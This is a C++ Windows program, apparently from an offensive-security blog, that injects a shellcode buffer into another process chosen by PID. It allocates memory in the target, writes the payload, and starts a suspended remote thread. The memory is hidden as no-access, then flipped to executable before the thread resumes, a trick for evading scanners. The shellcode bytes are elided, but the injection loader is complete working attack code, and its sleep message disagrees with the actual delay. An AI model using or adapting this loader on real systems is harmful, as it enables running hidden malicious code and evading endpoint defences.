#include "Windows.h"
#include "instr.h"
#include <iostream>

int main(int argc, char* argv[])
{

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	DWORD oldProtect;

	printf("#nosoc - expect the unexpected\n");
	printf("www.nosociety.de\n\n");

		unsigned char buf[] =
		"\xeb\x74\x31\...\x69\x70\x00";

	printf("\n[*] Buffer Size %i \n", sizeof buf);
	printf("[*] Start injecting to PID: %i\n", atoi(argv[1]));
	printf("[*] Opening process and get handle\n");
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	printf("[*] Allocate memory for our shellcode\n");
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	printf("[*] Write shellcode in the allocated memory @address %x\n", remoteBuffer);
	WriteProcessMemory(processHandle, remoteBuffer, buf, sizeof buf, NULL);
	printf("[*] Mark memory as PAGE_NO_ACCESS\n");
	VirtualProtectEx(processHandle, remoteBuffer, sizeof buf, 0x01, &oldProtect);
	printf("[*] Create thread\n");
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0x00000004, NULL);
	printf("[*] Sleep 8 seconds\n");
	Sleep(5000);
	printf("[*] Mark memory as RWX\n");
	VirtualProtectEx(processHandle, remoteBuffer, sizeof buf, 0x40, &oldProtect);
	printf("[*] Resume Thread\n");
	ResumeThread(remoteThread);
	printf("[*] Close handle\n");
	CloseHandle(processHandle);
	

	return 0;

}
